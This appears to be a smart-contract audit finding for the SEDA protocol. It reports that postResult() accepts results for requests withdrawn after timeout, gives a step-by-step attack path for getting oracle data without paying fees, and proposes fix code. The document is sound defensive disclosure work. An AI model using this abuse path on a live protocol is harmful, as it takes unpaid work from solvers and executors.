# Users will evade fees while still receiving data results affecting solvers/executors

### Summary

A missing validation in `postResult()` will cause an economic security vulnerability for solvers and executors as users will post a request, wait for timeout, withdraw their fees, but still receive the result data when a solver submits it.

### Root Cause

In [contracts/core/SedaCoreV1.sol:129-134](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/core/SedaCoreV1.sol#L129-L134) the `postResult()` function allows results to be posted for requests that have been withdrawn due to timeout:

```solidity
// Ensures results can't be submitted with timestamps from before the request was made,
// preventing potential replay or front-running attacks
// Note: Validation always passes for non-tracked requests (where requestDetails.timestamp is 0)
if (result.blockTimestamp <= requestDetails.timestamp) {
    revert InvalidResultTimestamp(result.drId, result.blockTimestamp, requestDetails.timestamp);
}
```
The code explicitly notes that "validation always passes for non-tracked requests" - which includes requests that were withdrawn after timing out. When a user calls `withdrawTimedOutRequest()`, the request details are deleted from storage, causing `requestDetails.timestamp` to be 0, which allows any result timestamp to pass validation.

### Internal Pre-conditions

1. A user needs to post a request with fees using `postRequest()`
2. The request needs to remain unfulfilled until the timeout period expires (default 86400 seconds / 1 day)
3. The user needs to call `withdrawTimedOutRequest()` to retrieve their fees

### External Pre-conditions

None specific to external protocols

### Attack Path

1. User calls `postRequest()` with appropriate fees
2. User waits for the request to time out
3. User calls `withdrawTimedOutRequest()` to get their fees back
4. After withdrawal, a solver/executor calls `postResult()` with a valid result and proof
5. The contract accepts and stores the result despite the request being withdrawn
6. The user can query `getResult()` to obtain the oracle data they requested
7. The solver receives no payment since the request details were deleted during withdrawal

### Impact

The solvers/executors suffer economic losses as they provide computational resources and valid results without receiving the promised compensation. The protocol incentive model is broken since users can potentially avoid paying fees while still receiving their requested data. This could lead to widespread abuse and eventually cause solvers to leave the network, damaging the protocol's utility and sustainability.

### Mitigation

There are several potential fixes:

1. Track withdrawn requests: Add a mapping to track requests that have been withdrawn due to timeout.
```solidity
mapping(bytes32 => bool) public withdrawnRequests;
```
Then in `withdrawTimedOutRequest()`, before deleting the request details:
```solidity
withdrawnRequests[requestId] = true;
```
And in `postResult()`, add a check:
```solidity
if (withdrawnRequests[result.drId]) {
    revert RequestWithdrawn(result.drId);
}
```
2. Maintain request status: Instead of deleting request details, change their status to withdrawn and check this status in `postResult()`.

Either approach would prevent results from being accepted after users have withdrawn their fees, preserving the economic incentives of the protocol and preventing users from getting free oracle data.
